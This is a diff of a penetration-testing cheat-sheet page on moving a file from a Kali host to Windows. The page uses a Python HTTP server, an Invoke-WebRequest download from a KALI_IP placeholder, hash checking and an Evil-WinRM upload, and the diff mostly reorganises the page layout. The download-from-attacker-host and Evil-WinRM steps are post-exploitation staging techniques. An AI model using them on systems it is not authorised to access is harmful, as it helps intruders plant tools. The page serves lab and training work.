@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/linux-to-windows.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Download a served file from Kali to Windows
+[Search this tool’s saved examples](/commands/notebook?tool=linux-to-windows) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Download a served file from Kali to Windows
 
 **Run in:** Windows PowerShell. **Requires:** Kali is serving the intended directory with python3 -m http.server 8000; Windows can reach that address and write the destination.
 
@@ -22,67 +30,9 @@ Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.bin' -OutFile 'C:\U
 Get-FileHash 'C:\Users\Public\file.bin' -Algorithm SHA256
 ```
 
-**Read the result:** Confirm the downloaded object is the intended file rather than an HTML error/login page, then compare its hash.
-
-**If The result is empty or contains an HTML error page:** PowerShell and curl.exe are different clients; quoting, TLS trust, proxy configuration and the current working directory can change the result.
+**What the result establishes:** Confirm the downloaded object is the intended file rather than an HTML error/login page, then compare its hash.
 
 **Next check:** Check the requested URL and server log, then compare the hash to the original before using the file.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Kali → Windows file transfer: choose the operation and read the result
-
-Serve a file from Kali and download it on Windows. Requires Windows → Kali TCP 8000.
-
-### What the result establishes
-
-Confirm the downloaded object is the intended file rather than an HTML error/login page, then compare its hash.
-
-### Prerequisites and common failures
-
-PowerShell and curl.exe are different clients; quoting, TLS trust, proxy configuration and the current working directory can change the result.
-
-### Example 1: 1. Kali — from the folder containing the file
-
-Run in: **Kali**. Keep the server running; serve only the intended transfer folder.
-
-```bash
-python3 -m http.server 8000
-```
-
-### Example 2: 2. Windows — save the file
-
-Run in: **Windows PowerShell**.
-
-```powershell
-Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'
-```
-
-### Example 3: Alternative — if already in Evil-WinRM
-
-Run in: **Evil-WinRM prompt**.
-
-```bash
-upload ./file.exe C:\Users\Public\file.exe
-```
-
-## Saved commands and notebook recipes
-
-Serve a file from Kali and download it on Windows. Requires Windows → Kali TCP 8000.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=linux-to-windows) · [All tools](/index)
 
 ## 1. Kali — from the folder containing the file
 
@@ -110,7 +60,15 @@ Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\U
 upload ./file.exe C:\Users\Public\file.exe
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The result is empty or contains an HTML error page | PowerShell and curl.exe are different clients; quoting, TLS trust, proxy configuration and the current working directory can change the result. |
+
+## Related tools and references
+
+- [Official documentation 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
 
 {/* VAULT_RELATED_START */}
 
@@ -119,5 +77,3 @@ upload ./file.exe C:\Users\Public\file.exe
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
